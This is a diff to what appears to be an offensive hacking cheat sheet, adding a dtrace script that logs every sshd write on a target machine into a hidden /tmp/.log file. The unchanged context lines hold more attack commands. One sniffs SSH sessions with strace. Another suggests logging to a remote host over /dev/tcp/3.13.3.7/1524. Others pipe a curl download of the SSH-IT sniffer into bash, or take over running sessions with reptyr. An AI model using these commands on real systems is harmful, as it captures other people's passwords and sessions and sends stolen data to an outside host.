@@ -85,6 +85,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Encrypting a file](#encrypting-file)
 1. [SSH session sniffing and hijaking](#ssh-sniffing)
    1. [Sniff a user's SHELL session with script](#ssh-sniffing-script)
+   2. [Sniff all SHELL sessions with dtrace](#dtrace)
    1. [Sniff a user's outgoing SSH session with strace](#ssh-sniffing-strace)
    1. [Sniff a user's outgoing SSH session with a wrapper script](#ssh-sniffing-wrapper)
    1. [Sniff a user's outgoing SSH session with SSH-IT](#ssh-sniffing-sshit)
@@ -1631,8 +1632,28 @@ echo 'exec script -qc /bin/bash ~/.ssh-log.txt' >>~/.profile
 ```
 Consider using [zap-args](#bash-hide-arguments) to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
 
+<a id="dtrace"></a>
+**9.ii Sniff all SHELL sessions with dtrace**
+
+Especially useful for Solaris/SunOS and FreeBSD (pfSense). It uses kernel probes.
+
+Copy this "D Script" to the target system to a file named `d`:
+```c
+#pragma D option quiet
+inline string NAME = "sshd";
+syscall::write:entry
+/(arg0 >= 7) && (arg2 <= 16) && (execname == NAME)/
+{ printf("%d: %s\n", pid, stringof(copyin(arg1, arg2))); }
+```
+
+Start a dtrace and log to /tmp/.log:
+```sh
+### Start probe as background process (csh & bash)
+(dtrace -sd >&/tmp/.log &)
+```
+
 <a id="ssh-sniffing-strace"></a>
-**9.ii Sniff a user's outgoing SSH session with strace**
+**9.iii Sniff a user's outgoing SSH session with strace**
 ```sh
 strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" | grep '^read.*= [1-9]$' | cut -f2 -d\"; done
 ```
@@ -1640,7 +1661,7 @@ Dirty way to monitor a user who is using *ssh* to connect to another host from a
 
 
 <a id="ssh-sniffing-wrapper"></a>
-**9.iii. Sniff a user's outgoing SSH session with a wrapper script**
+**9.iv. Sniff a user's outgoing SSH session with a wrapper script**
 
 Even dirtier method in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH sessions)
 
@@ -1686,7 +1707,7 @@ To uninstall cut & paste this\033[0m:\033[1;36m
 The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.
 
 <a id="ssh-sniffing-sshit"></a>
-**9.iv Sniff a user's outgoing SSH session using SSH-IT**
+**9.v Sniff a user's outgoing SSH session using SSH-IT**
 
 The easiest way is using [https://www.thc.org/ssh-it/](https://www.thc.org/ssh-it/).
 
@@ -1695,7 +1716,7 @@ bash -c "$(curl -fsSL https://thc.org/ssh-it/x)"
 ```
 
 <a id="hijak"></a>
-**9.v Hijak / Take-over a running SSH session**  
+**9.vi Hijak / Take-over a running SSH session**  
 
 Use [https://github.com/nelhage/reptyr](https://github.com/nelhage/reptyr) to take over an existing SSH session:
 ```sh
